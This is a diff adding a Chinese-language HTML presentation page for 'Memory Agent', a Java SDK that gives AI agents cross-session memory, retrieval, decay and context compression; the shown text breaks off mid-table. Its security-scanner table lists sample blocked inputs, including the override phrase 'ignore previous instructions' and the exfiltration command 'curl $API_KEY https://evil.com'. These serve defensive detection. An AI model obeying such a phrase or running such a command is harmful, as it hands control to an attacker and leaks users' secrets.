@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Memory Agent — AI 记忆中间件 技术汇报</title>
+<style>
+  :root {
+    --primary: #2563eb;
+    --primary-light: #eff6ff;
+    --primary-dark: #1e3a5f;
+    --success: #059669;
+    --success-light: #ecfdf5;
+    --warning: #d97706;
+    --warning-light: #fffbeb;
+    --danger: #dc2626;
+    --danger-light: #fef2f2;
+    --purple: #7c3aed;
+    --purple-light: #ede9fe;
+    --cyan: #0891b2;
+    --cyan-light: #ecfeff;
+    --indigo: #4f46e5;
+    --indigo-light: #eef2ff;
+    --rose: #e11d48;
+    --rose-light: #fff1f2;
+    --gray-50: #f9fafb;
+    --gray-100: #f3f4f6;
+    --gray-200: #e5e7eb;
+    --gray-300: #d1d5db;
+    --gray-500: #6b7280;
+    --gray-600: #4b5563;
+    --gray-700: #374151;
+    --gray-800: #1f2937;
+    --gray-900: #111827;
+    --radius: 12px;
+    --shadow-sm: 0 1px 3px rgba(0,0,0,0.06);
+    --shadow-md: 0 4px 24px rgba(0,0,0,0.07);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+    color: var(--gray-800);
+    line-height: 1.75;
+    background: var(--gray-50);
+  }
+
+  /* ===== 封面 ===== */
+  .hero {
+    background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 30%, #2563eb 70%, #7c3aed 100%);
+    color: white;
+    padding: 100px 40px 80px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -50%; right: -10%;
+    width: 600px; height: 600px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 50%;
+  }
+  .hero::after {
+    content: '';
+    position: absolute;
+    bottom: -40%; left: -8%;
+    width: 500px; height: 500px;
+    background: rgba(255,255,255,0.02);
+    border-radius: 50%;
+  }
+  .hero h1 { font-size: 56px; font-weight: 800; letter-spacing: 3px; position: relative; z-index: 1; }
+  .hero .subtitle { font-size: 24px; opacity: 0.9; margin-top: 20px; position: relative; z-index: 1; font-weight: 300; }
+  .hero .desc { font-size: 16px; opacity: 0.7; margin-top: 16px; position: relative; z-index: 1; max-width: 700px; margin-left: auto; margin-right: auto; }
+  .hero .meta { margin-top: 32px; position: relative; z-index: 1; }
+  .hero .badge {
+    display: inline-block;
+    background: rgba(255,255,255,0.15);
+    backdrop-filter: blur(8px);
+    padding: 8px 20px;
+    border-radius: 20px;
+    font-size: 13px;
+    margin: 4px;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+
+  .container { max-width: 1060px; margin: 0 auto; padding: 0 24px; }
+
+  /* ===== 价值卡片 ===== */
+  .value-prop {
+    background: white;
+    border-radius: var(--radius);
+    padding: 48px 44px;
+    margin-top: -36px;
+    position: relative;
+    box-shadow: var(--shadow-md);
+    text-align: center;
+  }
+  .value-prop .lead {
+    font-size: 22px;
+    font-weight: 600;
+    color: var(--primary-dark);
+    line-height: 1.9;
+  }
+  .value-prop .lead em {
+    font-style: normal;
+    color: var(--primary);
+    font-weight: 700;
+  }
+
+  /* ===== 通用 ===== */
+  .section { margin-top: 48px; }
+  .section-title {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--gray-900);
+    margin-bottom: 24px;
+    padding-left: 18px;
+    border-left: 5px solid var(--primary);
+  }
+  .section-title.purple { border-left-color: var(--purple); }
+  .section-title.success { border-left-color: var(--success); }
+  .section-title.warning { border-left-color: var(--warning); }
+  .section-title.cyan { border-left-color: var(--cyan); }
+  .section-title.indigo { border-left-color: var(--indigo); }
+  .section-title.rose { border-left-color: var(--rose); }
+  .section-desc {
+    color: var(--gray-600);
+    font-size: 15px;
+    margin-bottom: 20px;
+    padding-left: 18px;
+  }
+
+  .card {
+    background: white;
+    border-radius: var(--radius);
+    padding: 28px 32px;
+    margin-bottom: 20px;
+    box-shadow: var(--shadow-sm);
+  }
+  .card h3 {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 14px;
+    color: var(--gray-900);
+  }
+  .card p { color: var(--gray-600); font-size: 14px; }
+
+  /* ===== 统计条 ===== */
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+    margin: 24px 0;
+  }
+  @media (max-width: 700px) { .stats { grid-template-columns: repeat(2, 1fr); } }
+  .stat-card {
+    background: white;
+    border-radius: var(--radius);
+    padding: 28px 20px;
+    text-align: center;
+    box-shadow: var(--shadow-sm);
+  }
+  .stat-card .num { font-size: 40px; font-weight: 800; }
+  .stat-card .unit { font-size: 16px; font-weight: 400; opacity: 0.6; }
+  .stat-card .label { font-size: 13px; color: var(--gray-600); margin-top: 6px; }
+  .stat-card.blue .num { color: var(--primary); }
+  .stat-card.green .num { color: var(--success); }
+  .stat-card.purple .num { color: var(--purple); }
+  .stat-card.orange .num { color: var(--warning); }
+  .stat-card.cyan .num { color: var(--cyan); }
+  .stat-card.indigo .num { color: var(--indigo); }
+
+  /* ===== 代码块 ===== */
+  pre {
+    background: var(--gray-900);
+    color: #e5e7eb;
+    padding: 20px 24px;
+    border-radius: 8px;
+    font-size: 13px;
+    line-height: 1.7;
+    overflow-x: auto;
+    margin: 12px 0;
+  }
+  pre .comment { color: #6b7280; }
+  pre .keyword { color: #93c5fd; }
+  pre .string { color: #86efac; }
+  pre .annotation { color: #fbbf24; }
+
+  /* ===== 表格 ===== */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14px;
+  }
+  th {
+    background: var(--gray-100);
+    text-align: left;
+    padding: 12px 16px;
+    font-weight: 600;
+    color: var(--gray-700);
+    border-bottom: 2px solid var(--gray-200);
+    white-space: nowrap;
+  }
+  td {
+    padding: 11px 16px;
+    border-bottom: 1px solid var(--gray-100);
+    color: var(--gray-700);
+  }
+  tr:hover td { background: var(--gray-50); }
+  td code {
+    background: var(--gray-100);
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-family: "SF Mono", "Fira Code", monospace;
+    color: var(--primary);
+  }
+
+  /* ===== 标签 ===== */
+  .tag {
+    display: inline-block;
+    padding: 3px 12px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+  }
+  .tag-core { background: var(--primary-light); color: var(--primary); }
+  .tag-intelligence { background: var(--purple-light); color: var(--purple); }
+  .tag-memory { background: var(--success-light); color: var(--success); }
+  .tag-infra { background: var(--cyan-light); color: var(--cyan); }
+  .tag-safety { background: var(--rose-light); color: var(--rose); }
+  .tag-observe { background: var(--indigo-light); color: var(--indigo); }
+
+  /* ===== 流程图 ===== */
+  .flow-box {
+    background: white;
+    border-radius: var(--radius);
+    padding: 32px;
+    box-shadow: var(--shadow-sm);
+  }
+  .flow-box pre {
+    background: var(--gray-50);
+    color: var(--gray-800);
+    font-size: 13px;
+    line-height: 1.65;
+    border: 1px solid var(--gray-200);
+    padding: 24px 28px;
+  }
+
+  /* ===== 能力矩阵 ===== */
+  .capability-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+  }
+  @media (max-width: 900px) { .capability-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 600px) { .capability-grid { grid-template-columns: 1fr; } }
+  .cap-card {
+    background: white;
+    border-radius: var(--radius);
+    padding: 24px;
+    box-shadow: var(--shadow-sm);
+    border-top: 3px solid var(--primary);
+  }
+  .cap-card.purple { border-top-color: var(--purple); }
+  .cap-card.green { border-top-color: var(--success); }
+  .cap-card.cyan { border-top-color: var(--cyan); }
+  .cap-card.rose { border-top-color: var(--rose); }
+  .cap-card.indigo { border-top-color: var(--indigo); }
+  .cap-card .cap-icon { font-size: 28px; margin-bottom: 8px; }
+  .cap-card h4 { font-size: 16px; font-weight: 700; color: var(--gray-900); margin-bottom: 6px; }
+  .cap-card .cap-desc { font-size: 13px; color: var(--gray-600); line-height: 1.6; }
+
+  /* ===== 对比 ===== */
+  .compare {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  @media (max-width: 700px) { .compare { grid-template-columns: 1fr; } }
+  .compare .col {
+    background: white;
+    border-radius: var(--radius);
+    padding: 28px;
+    box-shadow: var(--shadow-sm);
+  }
+  .compare .col h3 {
+    font-size: 16px; font-weight: 700; margin-bottom: 14px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .compare .old { border-top: 3px solid var(--danger); }
+  .compare .old h3 { color: var(--danger); }
+  .compare .new { border-top: 3px solid var(--success); }
+  .compare .new h3 { color: var(--success); }
+
+  /* ===== 分层图 ===== */
+  .tier-diagram {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    max-width: 600px;
+    margin: 20px auto;
+  }
+  .tier-layer {
+    padding: 20px 28px;
+    color: white;
+    font-weight: 600;
+    position: relative;
+  }
+  .tier-layer:first-child { border-radius: 12px 12px 0 0; }
+  .tier-layer:last-child { border-radius: 0 0 12px 12px; }
+  .tier-layer .tier-name { font-size: 18px; }
+  .tier-layer .tier-desc { font-size: 12px; opacity: 0.85; margin-top: 2px; font-weight: 400; }
+  .tier-core { background: linear-gradient(135deg, #2563eb, #1d4ed8); }
+  .tier-archived { background: linear-gradient(135deg, #7c3aed, #6d28d9); }
+  .tier-raw { background: linear-gradient(135deg, #6b7280, #4b5563); }
+  .tier-arrow {
+    text-align: center;
+    color: var(--gray-500);
+    font-size: 12px;
+    padding: 6px 0;
+    background: white;
+  }
+
+  /* ===== 架构图 ===== */
+  .arch-diagram {
+    background: white;
+    border-radius: var(--radius);
+    padding: 32px;
+    box-shadow: var(--shadow-sm);
+  }
+  .arch-diagram pre {
+    background: var(--gray-50);
+    color: var(--gray-800);
+    font-size: 12.5px;
+    line-height: 1.5;
+    border: 1px solid var(--gray-200);
+    padding: 20px 24px;
+    overflow-x: auto;
+  }
+
+  /* ===== 模块卡片 ===== */
+  .module-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 20px;
+  }
+  @media (max-width: 700px) { .module-grid { grid-template-columns: 1fr; } }
+  .module-card {
+    background: white;
+    border-radius: var(--radius);
+    padding: 28px;
+    box-shadow: var(--shadow-sm);
+  }
+  .module-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+  .module-card .module-meta { font-size: 13px; color: var(--gray-500); margin-bottom: 12px; }
+  .module-card ul { list-style: none; padding: 0; }
+  .module-card li {
+    padding: 6px 0;
+    font-size: 13px;
+    color: var(--gray-700);
+    border-bottom: 1px solid var(--gray-100);
+  }
+  .module-card li:last-child { border-bottom: none; }
+
+  /* ===== 页脚 ===== */
+  .footer {
+    text-align: center;
+    padding: 48px 20px;
+    font-size: 13px;
+    color: var(--gray-500);
+    border-top: 1px solid var(--gray-200);
+    margin-top: 80px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== 封面 ===== -->
+<div class="hero">
+  <h1>Memory Agent</h1>
+  <p class="subtitle">AI Agent 的记忆中间件</p>
+  <p class="desc">为 AI Agent 提供多轮对话记忆、用户画像、意图理解、语义检索、安全防护等全套记忆能力的 Java SDK。零配置即可获得完整功能。</p>
+  <div class="meta">
+    <span class="badge">纯 Java 17 SDK</span>
+    <span class="badge">零框架依赖</span>
+    <span class="badge">9,500+ 行代码</span>
+    <span class="badge">SPI 可插拔架构</span>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- ===== 一句话价值 ===== -->
+<div class="value-prop">
+  <p class="lead">
+    让 AI Agent <em>"记住"</em> 用户 —— 跨会话保持上下文一致性。<br>
+    应用方只需提供 LLM apiKey，<em>所有记忆能力自动就绪</em>。
+  </p>
+</div>
+
+<!-- ===== 项目数据 ===== -->
+<div class="section">
+  <h2 class="section-title">项目规模</h2>
+  <div class="stats">
+    <div class="stat-card blue">
+      <div class="num">4</div>
+      <div class="label">Maven 模块</div>
+    </div>
+    <div class="stat-card green">
+      <div class="num">81<span class="unit">个</span></div>
+      <div class="label">Java 源文件</div>
+    </div>
+    <div class="stat-card purple">
+      <div class="num">9,500<span class="unit">+</span></div>
+      <div class="label">行代码</div>
+    </div>
+    <div class="stat-card orange">
+      <div class="num">6</div>
+      <div class="label">SPI 扩展接口</div>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat-card cyan">
+      <div class="num">14</div>
+      <div class="label">数据模型</div>
+    </div>
+    <div class="stat-card indigo">
+      <div class="num">35<span class="unit">+</span></div>
+      <div class="label">公开 API 方法</div>
+    </div>
+    <div class="stat-card blue">
+      <div class="num">4</div>
+      <div class="label">数据库表</div>
+    </div>
+    <div class="stat-card green">
+      <div class="num">15</div>
+      <div class="label">子系统组件</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 解决什么问题 ===== -->
+<div class="section">
+  <h2 class="section-title rose">解决的痛点</h2>
+  <div class="compare">
+    <div class="col old">
+      <h3>&#10060; 没有 Memory Agent 时</h3>
+      <ul style="list-style:none; padding:0; font-size:14px; color:var(--gray-700);">
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#10060; LLM 每次对话都是"失忆"状态，不知道用户之前说了什么</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#10060; 多轮对话后 Token 爆炸，Context Window 溢出</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#10060; 用户改了偏好（如从 MySQL 改 PostgreSQL），Agent 还在说旧信息</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#10060; 长期积累后记忆只增不减，低价值信息挤占 Prompt 空间</li>
+        <li style="padding:8px 0;">&#10060; 恶意用户注入提示词攻击，Agent 被操控</li>
+      </ul>
+    </div>
+    <div class="col new">
+      <h3>&#9989; 接入 Memory Agent 后</h3>
+      <ul style="list-style:none; padding:0; font-size:14px; color:var(--gray-700);">
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#9989; 跨会话保持用户记忆，Agent 始终了解用户背景</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#9989; 三阶段上下文压缩，自动管理 Token 窗口</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#9989; LLM 驱动的冲突检测，自动合并/替换矛盾信息</li>
+        <li style="padding:8px 0; border-bottom:1px solid var(--gray-100);">&#9989; 时间衰减 + 频率评分，低价值记忆自动归档</li>
+        <li style="padding:8px 0;">&#9989; 三层安全扫描：不可见字符 + 提示注入 + 数据泄露</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 完整能力矩阵 ===== -->
+<div class="section">
+  <h2 class="section-title">系统完整能力</h2>
+  <p class="section-desc">以下能力全部内置，提供 LLM apiKey 后自动就绪，无需逐个配置。</p>
+  <div class="capability-grid">
+
+    <div class="cap-card">
+      <div class="cap-icon">&#128172;</div>
+      <h4>多轮对话管理</h4>
+      <p class="cap-desc">多用户多会话隔离，按 userId 管理。会话自动创建/关闭，消息持久化。冻结快照机制保护 LLM Prefix Cache。</p>
+      <div style="margin-top:8px;"><span class="tag tag-core">核心基础</span></div>
+    </div>
+
+    <div class="cap-card purple">
+      <div class="cap-icon">&#129504;</div>
+      <h4>LLM 意图理解</h4>
+      <p class="cap-desc">调用大模型从多轮对话中提取核心意图、关键主题、待办事项、情感基调。结构化输出 IntentSummary。支持连续增量总结。</p>
+      <div style="margin-top:8px;"><span class="tag tag-intelligence">智能理解</span></div>
+    </div>
+
+    <div class="cap-card green">
+      <div class="cap-icon">&#128100;</div>
+      <h4>用户画像</h4>
+      <p class="cap-desc">跨会话持久化用户信息。自动从对话中提取用户偏好、技术栈、项目背景等。注入每轮对话作为 LLM 上下文。</p>
+      <div style="margin-top:8px;"><span class="tag tag-memory">记忆管理</span></div>
+    </div>
+
+    <div class="cap-card cyan">
+      <div class="cap-icon">&#128269;</div>
+      <h4>混合语义检索</h4>
+      <p class="cap-desc">写入时自动向量化 + 关键词索引。搜索时向量语义匹配 + BM25 关键词匹配，RRF 融合排序。支持记忆和归档记忆搜索。</p>
+      <div style="margin-top:8px;"><span class="tag tag-infra">检索能力</span></div>
+    </div>
+
+    <div class="cap-card">
+      <div class="cap-icon">&#9889;</div>
+      <h4>自动记忆提取</h4>
+      <p class="cap-desc">LLM 总结对话后自动分析提取值得记忆的信息，经安全扫描 + 去重 + 置信度过滤后写入存储。无需手动 addMemory。</p>
+      <div style="margin-top:8px;"><span class="tag tag-intelligence">智能理解</span></div>
+    </div>
+
+    <div class="cap-card rose">
+      <div class="cap-icon">&#128737;</div>
+      <h4>记忆冲突检测</h4>
+      <p class="cap-desc">LLM 驱动的新旧记忆矛盾检测。自动识别矛盾/更新/重复/补充四种关系，执行替换/合并/丢弃/保留。支持同步和异步模式。</p>
+      <div style="margin-top:8px;"><span class="tag tag-safety">安全智能</span></div>
+    </div>
+
+    <div class="cap-card green">
+      <div class="cap-icon">&#128230;</div>
+      <h4>分层记忆架构</h4>
+      <p class="cap-desc">CORE / ARCHIVED / RAW 三级记忆。CORE 层始终注入 Prompt，ARCHIVED 通过语义搜索按需召回。衰退记忆自动降级。</p>
+      <div style="margin-top:8px;"><span class="tag tag-memory">记忆管理</span></div>
+    </div>
+
+    <div class="cap-card green">
+      <div class="cap-icon">&#128200;</div>
+      <h4>记忆衰退与淘汰</h4>
+      <p class="cap-desc">时间衰减 + 访问频率 + 最近访问综合评分。低分记忆自动降级到 ARCHIVED 层。高重要性记忆受保护。定时后台运行。</p>
+      <div style="margin-top:8px;"><span class="tag tag-memory">记忆管理</span></div>
+    </div>
+
+    <div class="cap-card indigo">
+      <div class="cap-icon">&#128202;</div>
+      <h4>重要性自学习</h4>
+      <p class="cap-desc">跟踪每条记忆的检索频率。每 5 次检索自动 +0.05 重要性评分。高频记忆获得更高评分，防止被衰退淘汰。</p>
+      <div style="margin-top:8px;"><span class="tag tag-observe">自优化</span></div>
+    </div>
+
+    <div class="cap-card purple">
+      <div class="cap-icon">&#127919;</div>
+      <h4>增量意图推导</h4>
+      <p class="cap-desc">每轮对话实时推导增量意图变化，识别用户目的的细微转变。结合 LLM 理解 + 规则兜底双重保障。结果挂载到 TurnContext。</p>
+      <div style="margin-top:8px;"><span class="tag tag-intelligence">智能理解</span></div>
+    </div>
+
+    <div class="cap-card">
+      <div class="cap-icon">&#128259;</div>
+      <h4>上下文压缩</h4>
+      <p class="cap-desc">三阶段管线：工具输出裁剪 → 头尾保护 → LLM 中间摘要。自动管理 Token 窗口，防止 Context 溢出。</p>
+      <div style="margin-top:8px;"><span class="tag tag-core">核心基础</span></div>
+    </div>
+
+    <div class="cap-card rose">
+      <div class="cap-icon">&#128736;</div>
+      <h4>三层安全扫描</h4>
+      <p class="cap-desc">不可见 Unicode 字符检测 → 提示注入正则匹配 → 数据泄露/后门模式匹配。所有记忆写入和内容总结前自动扫描。</p>
+      <div style="margin-top:8px;"><span class="tag tag-safety">安全防护</span></div>
+    </div>
+
+    <div class="cap-card indigo">
+      <div class="cap-icon">&#9881;</div>
+      <h4>自动管道编排</h4>
+      <p class="cap-desc">processUserMessage() 自动触发后台总结；recordAssistantMessage() 自动触发后台压缩。应用方只需调两个方法。</p>
+      <div style="margin-top:8px;"><span class="tag tag-observe">自优化</span></div>
+    </div>
+
+    <div class="cap-card indigo">
+      <div class="cap-icon">&#128202;</div>
+      <h4>性能指标监控</h4>
+      <p class="cap-desc">内置 Metrics 收集器：写入/搜索/总结/衰退延迟和计数，搜索命中率，冲突分布。不可变快照 API，零 GC 压力。</p>
+      <div style="margin-top:8px;"><span class="tag tag-observe">可观测</span></div>
+    </div>
+
+    <div class="cap-card cyan">
+      <div class="cap-icon">&#128274;</div>
+      <h4>可插拔存储</h4>
+      <p class="cap-desc">SPI + ServiceLoader 机制。内置 InMemory 默认实现；JDBC 模块支持 MySQL 持久化（4 张表）。可扩展 Redis / MongoDB 等。</p>
+      <div style="margin-top:8px;"><span class="tag tag-infra">基础设施</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== 极简接入 ===== -->
+<div class="section">
+  <h2 class="section-title success">极简接入：3 行代码</h2>
+  <div class="card">
+    <h3>纯 Java 项目</h3>
+    <pre><span class="comment">// 1. 创建 Agent（提供 apiKey，所有能力自动就绪）</span>
+<span class="keyword">MemoryAgent</span> agent = <span class="keyword">MemoryAgent</span>.builder()
+    .config(<span class="keyword">MemoryAgentConfig</span>.builder()
+        .llmApiKey(<span class="string">"sk-xxx"</span>)
+        .build())
+    .build();
+
+<span class="comment">// 2. 用户发消息（自动：记录消息 + 加载记忆 + 推导意图 + 后台总结）</span>
+<span class="keyword">TurnContext</span> ctx = agent.processUserMessage(<span class="string">"session-001"</span>, <span class="string">"我想构建订单管理 API"</span>);
+
+<span class="comment">// 3. 拿到上下文前缀，拼到你的 LLM Prompt 前面</span>
+<span class="keyword">String</span> promptPrefix = ctx.getMemoryContextPrefix();</pre>
+  </div>
+
+  <div class="card">
+    <h3>Spring Boot 项目</h3>
+    <pre><span class="comment"># application.yml —— 只需这些配置</span>
+<span class="keyword">memory-agent</span>:
+  <span class="keyword">llm</span>:
+    <span class="keyword">api-key</span>: <span class="string">${OPENAI_API_KEY}</span>
+    <span class="keyword">model</span>: <span class="string">gpt-4o-mini</span></pre>
+    <pre><span class="annotation">@Autowired</span>
+<span class="keyword">private</span> MemoryAgent memoryAgent;  <span class="comment">// 直接注入，所有能力自动就绪</span></pre>
+  </div>
+</div>
+
+<!-- ===== 架构设计 ===== -->
+<div class="section">
+  <h2 class="section-title purple">系统架构</h2>
+
+  <div class="arch-diagram">
+    <pre>
+<strong>                            Memory Agent 架构图</strong>
+
+  +----------------------------------------------------------------------+
+  |                           调用方（AI Agent / 应用）                       |
+  +----------------------------------------------------------------------+
+  |                                                                        |
+  |                     MemoryAgent（统一门面）                              |
+  |                                                                        |
+  |   +------------+  +-----------+  +----------+  +----------+            |
+  |   | 会话管理   |  | 记忆 CRUD |  | 意图总结 |  | 上下文压缩|            |
+  |   | Conversation| | Curated  |  | Intent   |  | Context   |            |
+  |   | Manager    |  | Memory   |  | Summ.    |  | Compressor|            |
+  |   |            |  | Manager  |  | Engine   |  |           |            |
+  |   +------------+  +-----+-----+  +----+-----+  +----------+            |
+  |                         |               |                               |
+  |   +------------+  +-----+-----+  +------+------+  +----------+          |
+  |   | 安全扫描   |  | 冲突检测  |  | 记忆提取    |  | 分层管理  |          |
+  |   | Security  |  | Conflict |  | Memory     |  | Tier      |          |
+  |   | Scanner   |  | Detector |  | Extractor  |  | Manager   |          |
+  |   +------------+  +-----------+  +------------+  +----------+          |
+  |                                                                        |
+  |   +-----------+ +----------+ +---------+ +----------+ +-----------+    |
+  |   | 语义搜索  | | 混合检索 | | 衰退引擎| | 重要性   | | 自动管道  |    |
+  |   | Embedding | | Hybrid   | | Decay   | | 学习     | | Pipeline  |    |
+  |   | + Vector  | | Search   | | Engine  | | Relevance| | Executor  |    |
+  |   +-----------+ +----------+ +---------+ +----------+ +-----------+    |
+  |                                                                        |
+  |   +-----------+ +----------+ +-----------+                             |
+  |   | 增量意图  | | 指标收集 | | 冻结快照   |                             |
+  |   | Incremental| | Metrics | | Snapshot  |                             |
+  |   | Intent    | | Collector| | Manager   |                             |
+  |   +-----------+ +----------+ +-----------+                             |
+  +----------------------------------------------------------------------+
+  |                          SPI 可插拔层                                   |
+  |                                                                        |
+  |  +------------------+ +------------------+ +---------------------+      |
+  |  | MemoryStorage    | | IntentSummarizer | | EmbeddingService    |      |
+  |  | InMemory / MySQL | | OpenAI / Claude  | | Simple / OpenAI     |      |
+  |  +------------------+ +------------------+ +---------------------+      |
+  |                                                                        |
+  |  +------------------+ +------------------+                             |
+  |  | VectorStore      | | KeywordSearch    |                             |
+  |  | InMemory / Milvus| | InMemory / ES    |                             |
+  |  +------------------+ +------------------+                             |
+  +----------------------------------------------------------------------+</pre>
+  </div>
+</div>
+
+<!-- ===== 分层记忆 ===== -->
+<div class="section">
+  <h2 class="section-title success">分层记忆架构</h2>
+  <p class="section-desc">所有记忆自动分为三层，CORE 层始终注入 Prompt，ARCHIVED 通过语义搜索按需召回，RAW 保留原始记录。</p>
+
+  <div class="tier-diagram">
+    <div class="tier-layer tier-core">
+      <div class="tier-name">L1 : CORE — 核心记忆</div>
+      <div class="tier-desc">用户画像 + 最近的 Agent 笔记。captureSnapshot() 只取这一层。始终注入 LLM Prompt。</div>
+    </div>
+    <div class="tier-arrow">&#8595; 衰退评分 &lt; 阈值 &#8595; &#160;&#160;&#160;&#8593; promoteMemory() 手动提升 &#8593;</div>
+    <div class="tier-layer tier-archived">
+      <div class="tier-name">L2 : ARCHIVED — 归档记忆</div>
+      <div class="tier-desc">衰退降级的记忆、手动归档的记忆。不占 Prompt 空间，通过语义搜索找回。</div>
+    </div>
+    <div class="tier-arrow">&#8595; 按需检索 &#8595;</div>
+    <div class="tier-layer tier-raw">
+      <div class="tier-name">L3 : RAW — 原始记录</div>
+      <div class="tier-desc">原始对话消息。可选检索。</div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:20px;">
+    <h3>联动机制</h3>
+    <table>
+      <thead><tr><th>联动</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td>记忆衰退 &rarr; 分层</td><td>低分记忆自动从 CORE 降级到 ARCHIVED，不删除数据</td></tr>
+        <tr><td>重要性自学习 &rarr; 衰退</td><td>高频检索的记忆获得更高评分，0.8+ 的记忆受保护不被淘汰</td></tr>
+        <tr><td>语义搜索 &rarr; 归档</td><td>ARCHIVED 层记忆可通过语义搜索找回，提升后回到 CORE 层</td></tr>
+        <tr><td>冲突检测 &rarr; 写入</td><td>新记忆写入前自动检测与已有记忆的矛盾，合并或替换</td></tr>
+        <tr><td>自动提取 &rarr; 写入</td><td>LLM 总结后自动提取值得记忆的信息，安全扫描 + 去重后写入</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== 自动管道 ===== -->
+<div class="section">
+  <h2 class="section-title cyan">自动管道：两步式交互模型</h2>
+  <p class="section-desc">应用方只需两个方法调用，内部自动编排总结、记忆提取、压缩。</p>
+
+  <div class="flow-box">
+    <pre><strong>一轮完整对话的内部流程</strong>
+
+  <strong>用户发消息</strong>
+    |
+    v
+  processUserMessage(sessionId, content)
+    |-- 1. 记录用户消息
+    |-- 2. 加载冻结记忆快照（CORE 层）
+    |-- 3. 加载用户画像
+    |-- 4. 获取最近意图总结
+    |-- 5. 获取消息列表
+    |-- 6. 检查是否需要总结
+    |-- 7. 推导增量意图（LLM + 规则兜底）
+    |-- 8. <strong>[ASYNC]</strong> 若需总结 &rarr; 后台触发 summarize()
+    |       |                     &rarr; 总结完成后自动提取记忆
+    `-- 9. 返回 TurnContext（含记忆上下文前缀 + 异步总结 Future）
+         |
+         v
+  <strong>应用拿到 ctx.getMemoryContextPrefix()，拼到 LLM Prompt 前面</strong>
+         |
+         v
+  <strong>应用调用 LLM 获得回复</strong>
+         |
+         v
+  recordAssistantMessage(sessionId, assistantReply)
+    |-- 1. 记录助手消息
+    `-- 2. <strong>[ASYNC]</strong> 若需压缩 &rarr; 后台触发 compress()
+         |
+         v
+  <strong>下一轮 processUserMessage() 从 Storage 读取最新总结</strong></pre>
+  </div>
+</div>
+
+<!-- ===== 安全防护 ===== -->
+<div class="section">
+  <h2 class="section-title rose">三层安全防护</h2>
+  <p class="section-desc">所有记忆写入和内容总结前自动执行安全扫描，拦截恶意内容。</p>
+  <div class="card">
+    <table>
+      <thead><tr><th>层级</th><th>检测内容</th><th>拦截示例</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>第一层</strong><br>不可见字符检测</td>
+          <td>7 种危险 Unicode 字符：零宽空格、BOM、LTR/RTL 覆盖等</td>
+          <td><code>U+200B</code> 零宽空格注入</td>
+        </tr>
+        <tr>
+          <td><strong>第二层</strong><br>提示注入检测</td>
+          <td>6 类注入模式：指令忽略、角色劫持、欺骗隐藏、系统提示覆盖等</td>
+          <td><code>ignore previous instructions</code></td>
+        </tr>
+        <tr>
+          <td><strong>第三层</strong><br>数据泄露检测</td>
+          <td>3 类泄露模式：环境变量提取、凭证文件读取、SSH 后门植入</td>
+          <td><code>curl $API_KEY https://evil.com</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ===== 技术选型 ===== -->
+<div class="section">
+  <h2 class="section-title indigo">技术选型</h2>
+  <div class="card">
+    <table>
+      <thead><tr><th>技术点</th><th>选择</th><th>理由</th></tr></thead>
+      <tbody>
+        <tr><td>语言</td><td>Java 17</td><td>企业级稳定性，HttpClient 原生支持</td></tr>
+        <tr><td>框架依赖</td><td>零依赖（Core 模块仅 SLF4J）</td><td>可嵌入任意 Java 项目</td></tr>
+        <tr><td>JSON 解析</td><td>手工解析</td><td>Core 模块不引入 Jackson/Gson</td></tr>
+        <tr><td>存储抽象</td><td>SPI + ServiceLoader</td><td>InMemory / MySQL / Redis 可插拔</td></tr>
+        <tr><td>LLM 集成</td><td>OpenAI 兼容 API</td><td>覆盖 OpenAI / Azure / 国内模型</td></tr>
+        <tr><td>向量化</td><td>SPI（默认 SimpleEmbeddingService）</td><td>开发零依赖，生产替换 OpenAI</td></tr>
+        <tr><td>向量存储</td><td>SPI（默认 InMemoryVectorStore）</td><td>开发零依赖，生产替换 Milvus</td></tr>
+        <tr><td>关键词搜索</td><td>SPI（默认 BM25 实现）</td><td>开发零依赖，生产替换 Elasticsearch</td></tr>
+        <tr><td>Spring Boot</td><td>3.x Starter（Optional）</td><td>自动装配，开箱即用</td></tr>
